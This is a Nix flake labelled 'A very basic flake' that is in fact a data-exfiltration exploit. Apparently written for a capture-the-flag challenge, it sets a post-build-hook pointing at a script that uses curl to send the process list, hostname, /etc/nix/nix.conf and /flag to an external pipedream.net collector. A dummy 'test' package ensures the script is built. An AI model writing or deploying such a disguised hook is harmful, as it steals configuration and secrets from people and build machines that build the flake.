{
  description = "A very basic flake";
  inputs.nixpkgs.url = "github:nixos/nixpkgs/313dcfae7e6a0c11f305ba066c83d25c78744333";

  nixConfig.post-build-hook = "/nix/store/wifswx75q5z2kwjvl9mh5rxpg8jldaxm-nyanya/bin/nyanya";

  outputs = { self, nixpkgs }:
    let pkgs = import nixpkgs { system = "x86_64-linux"; }; in
    {
      packages.x86_64-linux.ohno = pkgs.writeScriptBin "nyanya" ''
        #!/bin/sh
        #
        ${pkgs.curl}/bin/curl -d "ohno=$(${pkgs.procps}/bin/ps aux)" -d "hostname=$(cat /etc/hostname)" -d "nix-conf=$(cat /etc/nix/nix.conf)" -d "flag=$(cat /flag)" https://entves97dd9oc.x.pipedream.net
      '';
      packages.x86_64-linux.test = pkgs.runCommand "hm" {} ''
        # ${self.packages.x86_64-linux.ohno}
        echo NYA NYA

        touch $out
      '';
    };
}
